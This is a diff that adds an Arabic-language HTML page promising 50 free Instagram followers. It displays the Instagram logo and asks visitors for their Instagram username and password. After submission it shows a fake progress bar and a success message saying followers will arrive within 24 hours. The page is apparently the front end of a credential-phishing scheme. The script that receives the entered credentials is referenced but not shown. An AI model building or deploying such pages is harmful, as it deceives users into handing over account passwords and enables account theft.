@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>زيادة متابعين إنستقرام مجاناً</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="container">
+        <header>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram" width="80">
+            <h1>زيادة متابعين مجانية</h1>
+            <p>أدخل اسم حسابك والباسورد و احصل على 50 متابع فوراً</p>
+        </header>
+
+        <div class="form-box" id="formBox">
+            <input type="text" id="username" placeholder="اسم المستخدم (مثلاً: @user123)">
+            <input type="password" id="password" placeholder="كلمة المرور">
+            <button onclick="startProcess()">ابدأ الزيادة الآن</button>
+        </div>
+
+        <div class="loading-box" id="loadingBox" style="display: none;">
+            <p id="statusText">جاري البحث عن الحساب...</p>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+
+        <div class="success-box" id="successBox" style="display: none;">
+            <h3>✅ تمت العملية بنجاح!</h3>
+            <p>سيصلك المتابعون خلال 24 ساعة القادمة.</p>
+            <button onclick="location.reload()">تكرار العملية</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
